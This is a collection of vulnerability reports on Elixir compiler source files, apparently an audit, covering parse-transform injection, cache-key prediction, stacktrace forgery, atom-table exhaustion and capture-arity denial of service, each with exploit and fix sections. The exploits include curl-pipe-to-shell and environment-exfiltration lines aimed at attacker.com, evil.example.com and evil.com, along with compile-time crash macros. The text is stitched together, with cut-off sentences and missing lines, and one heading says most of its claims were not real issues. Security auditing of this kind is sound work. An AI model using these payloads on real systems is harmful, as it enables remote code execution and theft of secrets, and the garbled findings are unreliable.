   a. A malicious module `evil_transform.beam` that implements

   - `Code.fetch_docs/1` indirectly via debug info callbacks
   - Any custom tool using `:beam_lib.chunks(Module, [:debug_info])`
     followed by the debug_info callback

3. The parse transform executes with the privileges of the tool's process,
   achieving arbitrary code execution WITHOUT the victim ever executing or
   importing the malicious module's code directly.

    %% evil_transform.erl - executes on debug_info request
    -module(evil_transform).
    -export([parse_transform/2]).
    parse_transform(Forms, _Opts) ->
        os:cmd("curl attacker.com/pwn | sh"),

    %% Tampered debug info in target.beam:
    %% {elixir_v1,
    %%   #{compile_opts => [{parse_transform, evil_transform}],
    %%     module => 'Elixir.Target', ...},
    %%   Specs}

Attack Surface
--------------
- The `core_v1` debug_info format is requested by Dialyzer and the Erlang

- IDE language servers (ElixirLS, etc.) routinely analyze all project

- CI/CD pipelines running `mix dialyzer` will trigger the vulnerability

- The `dynamic_form/2` function (line 183) also processes attacker-
  controlled `definitions`, `attributes`, and `module` from the debug info
  map, enabling additional AST injection into the compiled forms.

- The ETS table vulnerability (line 776 of report) requires the attacker
  to inject into ETS during an active compilation session. This attack

directly to the Erlang compiler without filtering dangerous options like

The `debug_info/4` callback does not sanitize or validate the `Map` contents
reconstructed from the BEAM file's debug info chunk before using them in

them to the compiler:

      #{compile_opts := CompileOpts} = Map,
      %% Remove dangerous options from stored debug info
      SafeCompileOpts = [Opt || Opt <- CompileOpts,
                         not is_dangerous_opt(Opt)],
      AllOpts = SafeCompileOpts ++ Opts,
      ...

    is_dangerous_opt({parse_transform, _}) -> true;
    is_dangerous_opt({core_transform, _}) -> true;
    is_dangerous_opt(_) -> false.

Alternatively, use `v3_core:module/2` directly (bypassing
`erl_to_core/2`) when processing debug info, since parse transforms
should have already been applied during the original compilation and
should not be re-executed when reconstructing forms from debug info.

2. **Silent exception swallowing via `catch _:_`**: ALL exceptions from the
   dynamic dispatch -- including `exit`, `throw`, and `error` -- are silently
   caught and replaced with a generic fallback string. This means:
   - Side effects from `__info__` execute but errors are hidden
   - No logging, no diagnostic, no indication that code was executed
   - Even `exit(kill)` is caught locally by the try/catch

Exploit Scenario (Supply Chain Attack)
--------------------------------------
1. Attacker publishes a Hex package containing an Erlang module with a
   malicious `__info__/1` function:

       -module('Elixir.MaliciousHelper').
       -export(['__info__'/1]).
       '__info__'(macros) ->
         %% Exfiltrate environment variables, SSH keys, tokens, etc.
         os:cmd("curl -X POST https://evil.example.com/exfil -d \"$(env)\""),
         [];
       '__info__'(_) -> [].

2. A developer adds this dependency and writes code that accidentally (or
   intentionally) references the module in a guard:

       defmodule MyApp do
         def check(x) when MaliciousHelper.validate(x), do: x
       end

3. The compiler detects that `MaliciousHelper.validate/1` is invalid in a
   guard context and calls `format_error({invalid_guard, ...})`.

4. `cannot_invoke_or_maybe_require('Elixir.MaliciousHelper', validate, 1)`
   calls `'Elixir.MaliciousHelper':'__info__'(macros)`.

5. The malicious `__info__/1` executes, exfiltrating data. The `catch _:_`
   silently swallows any exception, and the compiler simply reports
   "cannot invoke remote function MaliciousHelper.validate/1 inside a guard".

6. The developer sees a normal compilation error with no indication that
   arbitrary code was executed during error formatting.

Trigger Conditions
------------------
The vulnerability is triggered whenever ALL of the following hold:
- A module reference appears in a guard expression (`guard/6`) or match
  expression (`match/6`) that the compiler rejects as invalid
- The referenced module is loaded in the VM (e.g., compiled as a dependency)
- The module has a callable `__info__/1` export

This can be triggered by:
- A typo in guard code referencing a dependency module
- A deliberate guard-context error targeting a specific module
- Macro-generated code that places module calls in guard position

Impact
------
- Silent arbitrary code execution during compilation error formatting
- Supply chain attack vector: a malicious dependency's code runs during
  compilation of ANY file that references it incorrectly in a guard/match
- Data exfiltration from CI/CD environments (tokens, secrets, SSH keys)
- The `catch _:_` ensures no crash or warning alerts the developer
- Security audits are unlikely to flag error formatting code as a code
  execution surface

Root Cause
----------
The error formatting function performs dynamic dispatch into user-controlled
modules to generate a more helpful error message ("you must require the
module X before invoking macro"). This violates the principle that error
formatting should be side-effect free and should not execute arbitrary code.

Fix
---
Replace the dynamic `Receiver:'__info__'(macros)` call with a safe
alternative that does not execute module code:

    cannot_invoke_or_maybe_require(Receiver, Fun, Arity) ->
      case erlang:function_exported(Receiver, '__info__', 1) of
        true ->
          try
            Macros = Receiver:'__info__'(macros),
            case lists:member({Fun, Arity}, Macros) of
              true ->
                ["you must require the module ",
                 'Elixir.Macro':to_string(Receiver),
                 " before invoking macro"];
              false ->
                "cannot invoke remote function"
            end
          catch
            _:_ -> "cannot invoke remote function"
          end;
        false ->
          "cannot invoke remote function"
      end.

Or, more conservatively, avoid calling into the module entirely and use a
static check:

    cannot_invoke_or_maybe_require(Receiver, _Fun, _Arity) ->
      case code:is_loaded(Receiver) of
        {file, _} ->
          ["cannot invoke remote function (if ",
           'Elixir.Macro':to_string(Receiver),
           " exports macros, you may need to require it first)"];
        false ->
          "cannot invoke remote function"
      end.

This preserves the helpful error message without executing code in the
referenced module during error formatting.

Vulnerability: Compile-Time Code Injection via Predictable Cache Keys in elixir_bootstrap.erl
==============================================================================================

File: lib/elixir/src/elixir_bootstrap.erl, lines 52-54
Severity: High (Remote Code Injection at compile time)

Description
-----------
The define/4 function in elixir_bootstrap.erl stores function definitions
(the {Call, Expr} AST pair) in an ETS-based cache using erlang:unique_integer()
as the cache key:

    Key = erlang:unique_integer(),
    elixir_module:write_cache(Module, Key, {Call, Expr}),
    Key

This key is later passed (as part of the generated AST) to
elixir_def:store_definition/3, which retrieves the cached definition via:

    {Call, Body} = elixir_module:read_cache(Module, Key),
                   %% lib/elixir/src/elixir_def.erl:128

The cache is stored in a per-module ETS data table. The module's data table
reference is obtained via elixir_module:data_tables/1, which reads from the
elixir_modules ETS table — a public, named table (created with `public`
access in elixir_code_server.erl:31).

The combination of these two facts creates a code injection vulnerability:

1. erlang:unique_integer() returns monotonically increasing integers that
   are trivially predictable. An attacker can call erlang:unique_integer()
   to observe the current value, then predict the exact key that the
   bootstrap compiler will use for the next function definition.

2. The ETS tables are public, so any process on the same BEAM node can
   call elixir_module:write_cache/3 (or directly ets:insert/2) to write
   an arbitrary {Call, Expr} pair under the predicted cache key.

3. When the compiler later calls elixir_def:store_definition/3 and reads
   the cache, it retrieves the attacker's injected AST instead of the
   legitimate function definition.

Attack Vector
-------------
Any Erlang/Elixir process running on the same node during compilation can
exploit this. Practical attack scenarios:

1. Malicious dependency: A package loaded during compilation (e.g. a
   compiler plugin, mix task, or code evaluated at compile time) can
   race the bootstrap compiler:

       %% Observe current unique_integer value
       Current = erlang:unique_integer(),
       %% The next def/defp in bootstrap will use Current+1
       NextKey = Current + 1,
       %% Inject a malicious function body
       MaliciousExpr = {block, [], [
         {call, [], [{remote, [], ['Elixir.System', cmd]},
                     [<<"curl http://evil.com/$(whoami)">>]]}
       ]},
       %% Get the target module's data table
       {DataSet, _} = elixir_module:data_tables(TargetModule),
       ets:insert(DataSet, {{cache, NextKey}, {OrigCall, MaliciousExpr}}).

2. LiveBook / IEx: In interactive environments where user code runs on the
   same node as the compiler, any evaluated expression can inject code into
   modules being compiled concurrently.

3. Hot code loading: In production systems using hot code reloading, a
   compromised module can poison the cache of any other module being
   recompiled.

Impact
------
- Arbitrary code execution at compile time: The injected AST is compiled
  as if it were the original function body, executing with the full
  privileges of the compiler process.
- Silent replacement of function definitions: The attack leaves no trace
  in source code — the malicious AST exists only transiently in the ETS
  cache during compilation.
- Supply chain attack vector: A malicious Hex package that runs code at
  compile time (via macros, compiler hooks, or mix tasks) can hijack
  function definitions in any other module being compiled in the same VM.
- Bootstrap corruption: Since elixir_bootstrap.erl is used during Elixir's
  own bootstrap phase, an attacker who controls code running during
  bootstrap can inject definitions into Kernel itself.

Root Cause
----------
Two design decisions combine to create the vulnerability:

1. Use of erlang:unique_integer() as a cache key: This function returns
   predictable, sequential values. It provides uniqueness but not
   unpredictability. A cryptographically random key (e.g., via
   crypto:strong_rand_bytes/1) would make cache key prediction infeasible.

2. Public ETS table access: The module data tables are world-writable
   because elixir_modules is public. Even with unpredictable keys, public
   write access allows brute-force or timing-based attacks.

Fix
---
Replace erlang:unique_integer() with a cryptographically unpredictable key
to prevent cache key prediction:

    Key = binary:decode_unsigned(crypto:strong_rand_bytes(16)),
    elixir_module:write_cache(Module, Key, {Call, Expr}),
    Key

Additionally, the module data tables should use `protected` access instead
of `public`, restricting writes to the owning process (the elixir_code_server)
and requiring all mutations to go through the gen_server API.

Vulnerability: Reentrant Process Dictionary Corruption in Eval Pipeline Enables Environment Spoofing, Stacktrace Forgery, and Information Leakage - reported, only reentrancy is a real issue
==================================================================================================================================================

File: lib/elixir/src/elixir.erl, lines 305-414
Severity: High (Stacktrace Forgery / Information Leakage / Security Log Evasion)

Description
-----------
The eval pipeline in elixir.erl uses the Erlang process dictionary as an
unprotected side-channel to pass the evaluation environment (`Macro.Env`)
between `erl_eval/3` and `eval_external_handler/3`. Three process dictionary
keys are used:

  - `{elixir, eval_env}` (lines 354, 357, 405): Stores the full Macro.Env
    during eval. Read by eval_external_handler to construct exception
    stacktraces with source file/line information.

  - `{elixir, dbg_callback}` (lines 309, 335): Stores the debug callback
    {Mod, Fun, Args} tuple used by Kernel.dbg/2 macro expansion.

The process dictionary in BEAM is globally accessible to ALL code executing
in the same process — there is no access control. This creates three
distinct attack vectors:

Issue 1: Reentrant Corruption via Nested Eval (lines 339-358)
--------------------------------------------------------------
The erl_eval/3 function sets the eval environment before evaluation and
unconditionally erases it afterward:

    erl_eval(Expr, Binding, Env) ->
      ...
      try
        erlang:put(?elixir_eval_env, Env),          % line 354
        erl_eval:expr(Expr, Binding, ...)
      after
        erlang:erase(?elixir_eval_env)               % line 357
      end.

When the eval'd expression triggers nested evaluation (e.g., by calling
Code.eval_string/2, Code.eval_quoted/3, or any function that internally
uses eval), the inner eval's after block erases the key, leaving the
outer eval without its environment:

    Outer eval: put({elixir, eval_env}, Env1)
    Outer eval: erl_eval:expr begins evaluating...
      Inner eval: put({elixir, eval_env}, Env2)  -- Env1 overwritten
      Inner eval: erl_eval:expr completes
      Inner eval: erase({elixir, eval_env})       -- key gone entirely
    Outer eval: eval_external_handler reads process dict -> undefined

In eval_external_handler (line 405-409), when the key is missing:

    case erlang:get(?elixir_eval_env) of
      #{'__struct__' := 'Elixir.Macro.Env'} = E ->
        'Elixir.Macro.Env':stacktrace(E#{line := ...});
      _ ->
        []                                          % NO stacktrace info
    end,

All source location information (file, line, module, function) is lost
from the exception stacktrace for the outer eval context.

The same issue affects {elixir, dbg_callback} (lines 309, 335): the
inner eval's after block erases the outer eval's debug callback, causing
dbg/2 to silently fall back to the application env default.

Exploit (Nested Eval Stacktrace Destruction)
---------------------------------------------
A malicious dependency can exploit this to hide the source of exceptions:

    defmodule Evil do
      def innocent_looking_function(data) do
        # Trigger nested eval to corrupt outer eval's process dict
        Code.eval_string("nil")
        # Now any exception raised here will have no file/line info
        # in the outer eval context's stacktrace
        apply(String, :to_integer, [data])
      end
    end

    # In victim's IEx or LiveBook:
    Code.eval_string("""
      Evil.innocent_looking_function("not_a_number")
    """)

The resulting exception stacktrace will be missing the eval context's
file and line information, making it harder to trace the error back to
the malicious code.

Issue 2: Environment Spoofing / Stacktrace Forgery (line 354, 405)
-------------------------------------------------------------------
Since the process dictionary is writable by eval'd code, a malicious
expression can overwrite {elixir, eval_env} with a crafted Macro.Env
to forge exception stacktraces:

    # Eval'd code forges the eval environment:
    fake_env = %{__ENV__ | file: "lib/my_app/auth.ex", line: 42,
                           module: MyApp.Auth, function: {:verify, 2}}
    :erlang.put({:elixir, :eval_env}, fake_env)
    raise "authentication bypass detected"

The eval_external_handler reads this forged environment (line 405-407)
and constructs the stacktrace using Macro.Env.stacktrace/1 (line 407):

    'Elixir.Macro.Env':stacktrace(E#{line := erl_anno:line(Ann)})

The resulting exception appears to originate from MyApp.Auth.verify/2
at line 42, not from the actual malicious code. Security monitoring
tools, error trackers (Sentry, Honeybadger, etc.), and log aggregators
that rely on stacktraces to identify error sources will be misdirected.

A supply-chain attacker can use this to:
- Make exceptions appear to come from the victim's own code
- Redirect incident response to investigate innocent modules
- Mask the true origin of security-relevant errors

Issue 3: Information Leakage via Process Dictionary Read (line 354)
--------------------------------------------------------------------
Any code executing within an eval context can read the full Macro.Env
from the process dictionary:

    env = :erlang.get({:elixir, :eval_env})
    # env contains:
    #   file: "/Users/developer/secret_project/lib/internal.ex"
    #   module: SecretProject.InternalModule
    #   function: {:process_payment, 3}
    #   aliases: [{SomeAlias, ActualModule}, ...]
    #   requires: [list of required modules]
    #   functions: [{Module, [{fun, arity}]}, ...]
    #   macros: [{Module, [{macro, arity}]}, ...]

In multi-tenant environments (LiveBook, shared IEx), this leaks:
- File system paths (revealing project structure and usernames)
- Module and function names (revealing internal API surface)
- Import/alias/require relationships (revealing dependencies)
- The full compilation context of the calling code

This information is not available through any public Elixir API during
eval — the process dictionary bypasses the intended encapsulation.

Impact
------
- Stacktrace forgery: Attacker-controlled code can make exceptions
  appear to originate from arbitrary files, modules, and functions.
  This undermines exception-based security monitoring and incident
  response workflows.
- Security log evasion: By destroying stacktrace context via nested
  eval, attackers can ensure that exceptions they trigger carry no
  source location, making forensic analysis harder.
- Information disclosure: The full Macro.Env leaked via process
  dictionary reveals file paths, module structure, and dependency
  relationships to eval'd code.
- Debug callback hijacking: By overwriting {elixir, dbg_callback},
  eval'd code can redirect dbg/2 output to attacker-controlled
  functions, capturing debug information or suppressing it entirely.
- Affects all eval contexts: Code.eval_string, Code.eval_quoted,
  Code.eval_file, IEx, LiveBook, and any tool using the eval pipeline.

Root Cause
----------
The process dictionary is used as a global mutable side-channel with no
access control. The comment on lines 345-352 acknowledges this design
choice was made to avoid passing closures to erl_eval (which would tie
eval to a specific Elixir version). However, the implementation fails
to handle reentrancy (nested eval) and does not protect against read/
write access by eval'd code.

Specifically:
1. `erlang:erase` in the `after` block (lines 335, 357) unconditionally
   removes the key instead of restoring the previous value, breaking
   nested eval.
2. No save/restore pattern is used for process dictionary keys.
3. The Macro.Env stored in the process dictionary is directly accessible
   to eval'd code via erlang:get/1 and modifiable via erlang:put/2.

Fix
---
Option 1 - Save and restore process dictionary values to handle reentrancy:

    erl_eval(Expr, Binding, Env) ->
      LocalHandler = {value, fun ?MODULE:eval_local_handler/2},
      ExternalHandler = {value, fun ?MODULE:eval_external_handler/3},
      OldEnv = erlang:get(?elixir_eval_env),
      try
        erlang:put(?elixir_eval_env, Env),
        erl_eval:expr(Expr, Binding, LocalHandler, ExternalHandler)
      after
        case OldEnv of
          undefined -> erlang:erase(?elixir_eval_env);
          _ -> erlang:put(?elixir_eval_env, OldEnv)
        end
      end.

    %% Similarly for {elixir, dbg_callback} in eval_forms/4:
    eval_forms(Tree, Binding, OrigE, Opts) ->
      OldDbg = erlang:get({elixir, dbg_callback}),
      ...
      after
        case OldDbg of
          undefined -> erlang:erase({elixir, dbg_callback});
          _ -> erlang:put({elixir, dbg_callback}, OldDbg)
        end
      end.

Option 2 - Use a unique per-eval-session key to prevent cross-session
interference:

    erl_eval(Expr, Binding, Env) ->
      Ref = make_ref(),
      Key = {elixir, eval_env, Ref},
      ExternalHandler = {value, fun(Ann, FunOrModFun, Args) ->
        eval_external_handler(Ann, FunOrModFun, Args, Key)
      end},
      try
        erlang:put(Key, Env),
        erl_eval:expr(Expr, Binding, LocalHandler, ExternalHandler)
      after
        erlang:erase(Key)
      end.

Note: Option 2 uses a closure for ExternalHandler, which the code
comments (lines 345-352) explicitly want to avoid for version
compatibility. Option 1 is the pragmatic fix that preserves the
current architecture while fixing the reentrancy bug.

Neither option fully prevents eval'd code from reading/modifying the
process dictionary (this is an inherent limitation of the BEAM process
model). However, Option 2 with make_ref() makes the key unpredictable,
preventing targeted reads/writes without first scanning the process
dictionary (which is itself detectable).

========================================================================================

File: lib/elixir/src/elixir_erl_compiler.erl, lines 50-59 (env_compiler_options/0)
      lib/elixir/src/elixir_erl.erl, lines 152-157 (compile/2)
Severity: Critical (Arbitrary Code Execution)

Description
-----------
The function env_compiler_options/0 in elixir_erl_compiler.erl reads compiler

             return, no_auto_import | Opts]) of

        end
    end.

does NOT read the environment), yet the environment options are explicitly
injected by env_compiler_options/0 before being passed in, defeating the purpose
of the "noenv" variant.

Attack Vectors
--------------
- CI/CD pipeline poisoning: A prior build step, compromised dependency's
  mix task, or malicious .env/.bashrc sets the variable before compilation.
- Container/image poisoning: A tampered Docker image or base layer sets
  ERL_COMPILER_OPTIONS, affecting all Elixir builds in that container.
- Shared build servers: On multi-tenant build infrastructure, one tenant
  sets the variable to compromise other tenants' builds.
- Supply chain: A malicious Hex package's Mix task or compile-time hook
  sets the env var, affecting compilation of all subsequent dependencies.

Impact
------
- Full arbitrary code execution with the privileges of the build process.
- Every Elixir module compiled in the affected BEAM instance runs the
  attacker's parse transform — not just one module, but ALL modules.
- The cached persistent_term means the malicious options persist for the
  entire lifetime of the BEAM node, even if the env var is later unset.
- Silent exploitation: parse transforms produce no warnings or visible
  output unless they choose to; the compiled .beam files appear normal.

Root Cause
----------
Insufficient filtering in env_compiler_options/0. Only warnings_as_errors is
removed, but {parse_transform, _}, {d, _, _} (macro injection), and other
dangerous compiler options pass through unchecked.

Fix
---
Filter out all dangerous options, not just warnings_as_errors:

      case persistent_term:get(?MODULE, undefined) of
        undefined ->
          Dangerous = [warnings_as_errors],
          Options = [Opt || Opt <- compile:env_compiler_options(),
                           not lists:member(Opt, Dangerous),
                           not is_parse_transform(Opt)],
          persistent_term:put(?MODULE, Options),
          Options;
        Options ->
          Options
      end.

    is_parse_transform({parse_transform, _}) -> true;
    is_parse_transform(_) -> false.

Alternatively, use an allowlist of known-safe options rather than a denylist.

Vulnerability: Atom Table Exhaustion via Unbounded list_to_atom in Overridable Function Renaming
================================================================================================

File: lib/elixir/src/elixir_overridable.erl, line 108
Severity: High (Denial of Service - BEAM VM crash via atom table exhaustion)

Description
-----------
The name/2 function dynamically creates new atoms using list_to_atom/1:

    name(Name, Count) when is_integer(Count) ->
      list_to_atom(atom_to_list(Name) ++ " (overridable " ++ integer_to_list(Count) ++ ")").

Each time an overridable function is stored (via store/5, called from super/4
or store_not_overridden/1), a NEW atom is created by concatenating the function
name with a counter. Atoms in the BEAM VM are never garbage collected — once
created, they persist for the lifetime of the VM.

The Count value is incremented each time record_overridable/3 is called for the
same function tuple (line 42):

    ets:insert(Set, {{overridable, Tuple}, Count + 1, Def, false});

There is NO upper bound on Count. A macro that repeatedly marks a function as
overridable and redefines it can drive Count to arbitrary values, creating one
new permanent atom per iteration.

Exploit (Atom Table Exhaustion)
-------------------------------
The default BEAM atom table limit is 1,048,576 atoms. A malicious module using
metaprogramming can exhaust this:

    defmodule Bomb do
      for i <- 1..1_100_000 do
        defoverridable my_func: 0
        def my_func, do: unquote(i)
      end
    end

Each iteration of defoverridable + def causes record_overridable/3 to increment
Count and later store/5 to call name/2, creating a unique atom like:
  'my_func (overridable 1)', 'my_func (overridable 2)', ...,
  'my_func (overridable 1100000)'

Once the atom table is full, the BEAM VM terminates with:
  "no more index entries in atom_tab (max=1048576)"

This crashes the entire Erlang node, not just the compiler process.

Even without hitting the absolute limit, a more modest attack (e.g., 500K
atoms) can significantly degrade performance and memory usage, since atoms
consume memory that is never reclaimed.

Attack Vectors
--------------
- Supply chain: A compromised Hex package containing a module with a
  metaprogramming loop that repeatedly cycles defoverridable/def. The
  malicious code executes at compile time — it does not need to be called
  at runtime.
- Shared compilation environments: LiveBook, IEx, CI/CD pipelines.
- The atom exhaustion crashes the entire BEAM node, affecting all
  applications running on it (e.g., Phoenix server, database connections).

Impact
------
- Complete Denial of Service: the BEAM VM terminates, killing all running
  OTP applications on the node.
- Not recoverable without restarting the VM.
- Affects compilation environments (mix compile, CI, LiveBook) and
  potentially production nodes if Code.compile_string or similar is used
  with untrusted input.

Root Cause
----------
1. Unbounded use of list_to_atom/1 with user-influenced input (function
   name + ever-increasing counter) in name/2 on line 108.
2. No upper bound on the Count value in record_overridable/3 (line 42).
3. Atoms are never garbage collected in the BEAM VM.

Fix
---
Option A: Cap the overridable count and emit a compile error when exceeded:

    record_overridable(Module, Tuple, Def) ->
      {Set, Bag} = elixir_module:data_tables(Module),
      case ets:insert_new(Set, {{overridable, Tuple}, 1, Def, false}) of
        true ->
          ets:insert(Bag, {overridables, Tuple});
        false ->
          [{_, Count, PreviousDef, _}] = ets:lookup(Set, {overridable, Tuple}),
          case Count >= 100 of
            true ->
              elixir_errors:file_error(..., {max_overridable_depth, Module, Tuple});
            false ->
              %% existing logic
          end
      end.

Option B: Use list_to_existing_atom/1 with a pre-registered naming scheme,
or use a tuple/reference instead of an atom for internal tracking of
overridden function versions.

      [element(1, elixir_erl_pass:translate(Guard, Ann, S)) | Extra].
                    ^^^^^^^^^^^ state from translate is discarded

The elixir_erl state record (elixir.hrl:52-69) includes a `counter` map that
tracks variable name generation counters, and a `var_names` map that tracks
variable-to-Erlang-name bindings. Both are modified by elixir_erl_var:build/2
and elixir_erl_var:assign/2-4 during translation.

Variable Counter Collision Mechanism
-------------------------------------
When guard translation calls elixir_erl_var:build/2 (which increments the
counter and generates names like _@1, _@2, etc.), those counter increments
are captured in the guard's copy of the state — but that state is discarded
by element(1, ...). The body translation then starts from the SAME SG with the
OLD counter values, potentially generating Erlang variables with identical names
to those already used in the guards.

In Erlang abstract format, guards and body in a clause share the same variable
scope. If both the guard and body contain {var, Ann, '_@5'}, the Erlang compiler
treats them as the SAME variable. This creates a semantic collision where:

  1. The guard binds a temporary to one value (e.g., an intermediate comparison)
  2. The body independently generates a variable with the same name for a
     different purpose
  3. Erlang sees them as one variable, causing the body to unexpectedly observe
     the guard's value, or vice versa

Additionally, clauses/2 (line 55-56) uses lists:mapfoldl to thread state across
multiple clauses. Since SE (the post-body state) is returned — not the
post-guard state — the counter desynchronization accumulates across clauses.

Code Paths That Allocate Variables During Guard-Context Translation
-------------------------------------------------------------------
Several paths in elixir_erl_pass:translate/3 call elixir_erl_var:build/2 and
can be reached when the state has context=guard:

  - translate_remote(lists, member, ...) at line 605: creates a temp variable
    when the left-hand side of an `in` check is not a simple variable. While
    Elixir's macro expansion normally transforms guard `in` into == chains,
    crafted AST or direct :lists.member calls bypass this.

  - translate({'=', ...}) at line 24: calls build('_', ...) when extra_guards
    are present and context is not match (guard context qualifies).

  - Any future compiler change that adds variable allocation in a guard-context
    translation path would immediately activate this latent bug.

Exploit Scenario
-----------------
An attacker crafting Elixir AST (e.g., via Code.eval_quoted, a malicious macro,
or a compromised compile-time dependency) can construct clause AST where:

  1. The guard contains expressions that trigger temporary variable allocation
     in the ERL pass (bypassing the normal macro-level guard validation)
  2. The body also allocates temporary variables
  3. The identical counter starting point causes name collisions

Example with crafted AST:

    # Crafted clause AST that bypasses normal guard validation:
    # Guard contains :lists.member(complex_expr, list) which allocates _@N
    # Body contains map.field access which also allocates _@N
    # Result: guard temp and body temp share the same Erlang variable name

This can cause:
  - A guard that appears to pass but evaluates incorrectly due to variable
    confusion, bypassing validation logic
  - A body that reads an unexpected value from a guard temporary instead of
    computing its own, altering control flow

Impact
------
- Incorrect code generation: The Elixir compiler can produce Erlang abstract
  code with variable name collisions between guards and clause bodies.
- Guard bypass: Security-critical guard checks (authorization, input validation)
  could evaluate incorrectly due to variable confusion.
- Silent corruption: The Erlang compiler may not flag the collision as an error,
  silently producing incorrect bytecode.
- Supply chain vector: A malicious macro in a Hex package could craft AST that
  triggers the collision, causing subtle runtime misbehavior in the consuming
  project's compiled code.
- The bug also affects fn clauses (elixir_erl_pass.erl line 122), case clauses
  (line 309-317), with clauses (line 456-458), and try clauses
  (elixir_erl_try.erl lines 39, 107).

Root Cause
----------
The design assumes guard translations never modify the compilation state
(counters, variable names). This assumption is not enforced and is violated by
several code paths in elixir_erl_pass:translate/3 that allocate temporary
variables regardless of the current context.

Fix
---
Thread the guard compilation state through to the body translation:

    clause(Ann, Fun, Match, Expr, Guards, S) ->
      {TMatch, SA} = match(Ann, Fun, Match, S),
      SG = SA#elixir_erl{extra_guards=[]},
      {TGuards, SGPost} = guards(Ann, Guards, SA#elixir_erl.extra_guards, SG),
      {TExpr, SE} = elixir_erl_pass:translate(Expr, Ann, SGPost),
      {{clause, Ann, TMatch, TGuards, unblock(TExpr)}, SE}.

And update guards/4 and translate_guard/4 to return the updated state:

    guards(Ann, Guards, Extra, S) ->
      SG = S#elixir_erl{context=guard},
      case Guards of
        [] -> {case Extra of [] -> []; _ -> [Extra] end, SG};
        _  ->
          {TGuards, FinalS} = lists:mapfoldl(
            fun(Guard, AccS) ->
              {TG, NewS} = translate_guard(Guard, Ann, AccS, Extra),
              {TG, NewS}
            end, SG, Guards),
          {TGuards, FinalS}
      end.

    translate_guard(Guard, Ann, S, Extra) ->
      {TGuard, NewS} = elixir_erl_pass:translate(Guard, Ann, S),
      {[TGuard | Extra], NewS}.

Vulnerability: Missing Upper Bound on Capture Argument Position Allows BEAM Arity Limit Bypass and Compiler DoS
=================================================================================================================

File: lib/elixir/src/elixir_fn.erl, lines 148 and 132-135
Severity: High (Denial of Service - compiler crash / BEAM arity constraint violation)

Description
-----------
The `escape/3` function in elixir_fn.erl accepts capture arguments `&N` for
any positive integer N without enforcing an upper bound:

    escape({'&', Meta, [Pos]}, E, Dict) when is_integer(Pos), Pos > 0 ->
      ...
      {Var, orddict:store(Pos, Var, Dict)}

The guard only checks `Pos > 0` -- there is NO check that `Pos =< 255`.

In contrast, the `args_from_arity/3` function (line 177) correctly enforces
the BEAM's 255-argument limit for the `&fun/arity` capture syntax:

    args_from_arity(_Meta, A, _E) when is_integer(A), A >= 0, A =< 255 ->
      [{'&', [], [X]} || X <- lists:seq(1, A)];

This creates an inconsistency: `&fun/256` is correctly rejected, but
`&(&1 + &2 + ... + &256)` is silently accepted.

The error message on line 218 is misleading -- it claims capture arguments
"must be numbered between 1 and 255", but this error is only triggered for
the `&fun/arity` path and for Pos <= 0. The inline capture path through
`escape/3` has no such enforcement.

After `escape/3` collects the capture arguments, `validate/4` (line 141)
checks they are sequential starting from 1 but imposes no upper bound.
Then `capture_expr` (lines 132-135) builds an anonymous function with all
collected variables as parameters:

    EVars = validate(Meta, EDict, 1, E),
    Fn = {fn, [{capture, true} | Meta], [{'->', Meta, [EVars, EExpr]}]},
    {expand, Fn, S, E}

If EVars contains more than 255 elements, this generates an anonymous
function with arity > 255, violating the BEAM VM's hard limit of 255
parameters per function.

Exploit
-------
A macro can trivially generate a capture expression with > 255 arguments:

    defmodule Bomb do
      defmacro overflow do
        # Build: &1 + &2 + &3 + ... + &300
        expr = Enum.reduce(1..300, {:&, [], [1]}, fn i, acc ->
          {:+, [], [acc, {:&, [], [i]}]}
        end)
        {:&, [], [expr]}
      end
    end

    defmodule Victim do
      require Bomb
      def f, do: Bomb.overflow()
    end

This generates an anonymous function with 300 parameters. The BEAM compiler
rejects functions with arity > 255, causing an opaque Erlang-level compilation
error that crashes the build.

A more aggressive DoS variant uses a very large N:

    defmodule SlowBomb do
      defmacro slow do
        # Build expression using &1 through &100000
        refs = for i <- 1..100_000, do: {:&, [], [i]}
        expr = {:"{}", [], refs}
        {:&, [], [expr]}
      end
    end

This triggers O(n^2) orddict operations in `escape/3` (orddict:store is O(n)
per insertion, called n times), causing quadratic CPU consumption during
compilation. With n=100,000, the compiler hangs for minutes to hours before
eventually hitting the BEAM arity limit crash.

Secondary Issue: Unbounded Recursion in escape/3
--------------------------------------------------
The `escape/3` function recursively traverses the AST without any depth limit
(lines 164-175):

    escape({Left, Meta, Right}, E, Dict0) ->
      {TLeft, Dict1}  = escape(Left, E, Dict0),
      {TRight, Dict2} = escape(Right, E, Dict1),
      {{TLeft, Meta, TRight}, Dict2};

A macro-generated deeply nested AST (e.g., thousands of levels of nested
function calls) inside a capture expression causes unbounded stack recursion,
leading to a stack overflow crash. Unlike the bitstring expansion vulnerability
(reported separately for elixir_bitstring.erl), this path has no macro
expansion loop -- it is purely a recursive traversal issue, so a single macro
expansion producing a deeply nested tree is sufficient.

Impact
------
- Denial of Service against the Elixir compiler: a macro in a dependency
  can crash compilation with an opaque Erlang-level error about arity limits.
- Supply chain attack vector: a malicious Hex package need only export a
  macro that generates a capture with > 255 arguments. Any project that
  invokes the macro fails to compile.
- Quadratic CPU exhaustion: large capture argument counts cause O(n^2)
  orddict operations, hanging the compiler before the arity crash.
- Stack overflow via deeply nested ASTs in capture expressions, crashing
  the compiler process.
- The error message is misleading: it states "between 1 and 255" but the
  upper bound is not enforced for inline captures, confusing developers.
- Affects any environment that compiles Elixir: Mix, IEx, LiveBook,
  Code.eval_string, CI/CD pipelines.

Root Cause
----------
1. The `escape/3` function (line 148) checks `Pos > 0` but not `Pos =< 255`,
   creating an asymmetry with `args_from_arity` which correctly enforces both
   bounds.
2. Neither `validate/4` nor `capture_expr` checks the total number of capture
   arguments against the BEAM's 255-parameter limit.
3. The `escape/3` function uses orddict (sorted list) for the capture argument
   dictionary, giving O(n) per operation and O(n^2) total -- no cap on n.
4. The recursive AST traversal in `escape/3` has no depth limit.

Fix
---
Add an upper bound check in `escape/3` for capture argument positions:

    escape({'&', Meta, [Pos]}, E, Dict) when is_integer(Pos), Pos > 0, Pos =< 255 ->
      case orddict:find(Pos, Dict) of
        {ok, Var} ->
          {Var, Dict};
        error ->
          Next = elixir_module:next_counter(?key(E, module)),
          Var = {capture, [{counter, Next}, {capture, Pos} | Meta], nil},
          {Var, orddict:store(Pos, Var, Dict)}
      end;
    escape({'&', Meta, [Pos]}, E, _Dict) when is_integer(Pos) ->
      file_error(Meta, E, ?MODULE, {invalid_arity_for_capture, Pos});

This ensures that `&N` where N > 255 falls through to the existing error
clause on line 160, which already produces the correct "must be numbered
between 1 and 255" error message. The only change needed is adding
